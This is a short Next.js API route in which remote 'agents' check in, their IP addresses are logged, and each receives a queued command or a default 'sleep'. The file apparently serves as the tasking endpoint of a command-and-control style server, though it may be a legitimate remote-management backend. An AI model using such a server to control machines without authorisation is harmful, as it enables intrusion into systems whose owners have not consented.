import { NextResponse } from 'next/server';
import { saveAgent, popCommand, AgentData } from '../db';

export async function POST(request: Request) {
    try {
        const data: AgentData = await request.json();

        // Automatically capture the IP address from headers
        const ip = request.headers.get('x-forwarded-for') ||
            request.headers.get('x-real-ip') ||
            'Unknown';

        const cleanData = {
            ...data,
            ip: data.ip || ip
        };

        saveAgent(cleanData);

        // Check if there is a pending command for this specific agent
        const pendingCmd = popCommand(data.id);
        const commandToSend = pendingCmd ? pendingCmd : 'sleep';

        return NextResponse.json({ status: 'ok', command: commandToSend }, { status: 200 });
    } catch (error) {
        return NextResponse.json({ error: 'Invalid payload' }, { status: 400 });
    }
}
